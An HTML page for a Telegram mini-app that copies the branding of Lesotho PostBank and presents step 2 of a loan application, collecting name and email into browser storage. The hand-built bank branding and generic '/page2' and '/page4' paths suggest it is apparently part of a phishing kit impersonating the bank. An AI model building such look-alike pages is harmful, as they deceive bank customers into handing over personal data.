<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LPB Lesotho - Loan Application</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --lpb-blue: #0054a6;        /* LPB Royal Blue */
            --lpb-blue-dark: #003e7e;
            --lpb-green: #00a651;       /* LPB Vibrant Green */
            --lpb-green-dark: #008541;
            --lpb-gold: #a38228;        /* LPB Ochre/Gold Accent */
            --lpb-dark: #121820;        /* Deep Dark Text Accent */
            --bg-color: #f4f7fa;
            --card-bg: #ffffff;
            --text-main: #111111;
            --text-muted: #666666;
            --input-border: #d9e4f0;
            --input-focus: #0054a6;
            --btn-gray: #f0f2f5;
            --btn-gray-text: #444444;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Top Header Navigation Bar - LPB Blue & Green Accent */
        .app-header {
            width: 100%;
            background-color: var(--lpb-blue);
            border-bottom: 4px solid var(--lpb-green);
            height: 62px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
        }

        .back-btn-top {
            color: #ffffff;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            font-size: 22px;
            font-weight: 900;
            letter-spacing: 0.5px;
            color: #ffffff;
        }

        .header-logo-badge {
            width: 28px;
            height: 28px;
            background: #ffffff;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 7px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.15);
        }

        .header-title .region {
            color: #ffffff;
            font-size: 12px;
            margin-left: 7px;
            font-weight: 700;
            text-transform: uppercase;
            background: var(--lpb-green);
            padding: 2px 7px;
            border-radius: 4px;
            letter-spacing: 0.5px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: #ffffff;
            border-radius: 2px;
        }

        /* Card Layout */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 20px;
            box-shadow: 0 4px 25px rgba(0, 84, 166, 0.08);
            border: 1px solid #e6eef7;
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 25px;
            color: var(--lpb-blue);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 24px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* Step Progress Bar */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 0 auto 32px;
            width: 100%;
        }

        .step-bar {
            flex: 1;
            height: 6px;
            background-color: #d9e4f0;
            border-radius: 3px;
        }

        .step-bar.active {
            background-color: var(--lpb-green);
        }

        /* Form Inputs */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 14px;
            font-weight: 700;
            color: var(--lpb-blue);
            margin-bottom: 8px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #111111;
            outline: none;
            width: 100%;
            transition: border-color 0.2s;
        }

        .form-control::placeholder {
            color: #a0aec0;
        }

        .form-control:focus {
            border-color: var(--input-focus);
        }

        /* Buttons Container */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #e2e6ea;
        }

        .btn-next {
            background: linear-gradient(135deg, var(--lpb-blue) 0%, #0066cc 100%);
            color: #ffffff;
            border: none;
            border-bottom: 3px solid var(--lpb-green);
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s, transform 0.1s;
            box-shadow: 0 4px 14px rgba(0, 84, 166, 0.3);
        }

        .btn-next:active {
            background: var(--lpb-blue-dark);
            transform: scale(0.99);
        }

        /* Footer Banner */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #667788;
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- LPB Header Navigation Bar -->
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Back</a>
    <div class="header-title">
        <div class="header-logo-badge">
            <!-- LPB Mountain Peak Emblem -->
            <svg width="20" height="20" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M16 3L3 15V22L16 10L29 22V15L16 3Z" fill="#0054a6"/>
                <path d="M16 16L6 26H26L16 16Z" fill="#00a651"/>
                <circle cx="16" cy="11.5" r="3" fill="#ffffff"/>
                <circle cx="16" cy="11.5" r="1.8" fill="#a38228"/>
            </svg>
        </div>
        <span>LPB</span><span class="region">Lesotho</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Loan Application</h1>
    <div class="subtext">Step 2 of 3</div>

    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <!-- Personal Info Form -->
    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">First Name</label>
            <input type="text" id="firstName" class="form-control" placeholder="Thabo" required>
        </div>

        <div class="form-group">
            <label for="lastName">Last Name</label>
            <input type="text" id="lastName" class="form-control" placeholder="Mokoena" required>
        </div>

        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" class="form-control" placeholder="thabo.mokoena@example.ls" required>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">PREVIOUS</button>
            <button type="submit" class="btn-next">NEXT</button>
        </div>
    </form>
</div>

<!-- Footer -->
<div class="footer-banner">
    © 2026 Lesotho PostBank (LPB) - Lesotho
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Auto-fill existing saved user info
        const fName = localStorage.getItem('firstName');
        const lName = localStorage.getItem('lastName');
        const email = localStorage.getItem('email');

        if (fName) document.getElementById('firstName').value = fName;
        if (lName) document.getElementById('lastName').value = lName;
        if (email) document.getElementById('email').value = email;
    };

    function goNext(event) {
        event.preventDefault();

        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();

        if (!fName || !lName || !email) {
            alert("Please fill in all fields.");
            return;
        }

        // Save stored details
        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>

</body>
</html>
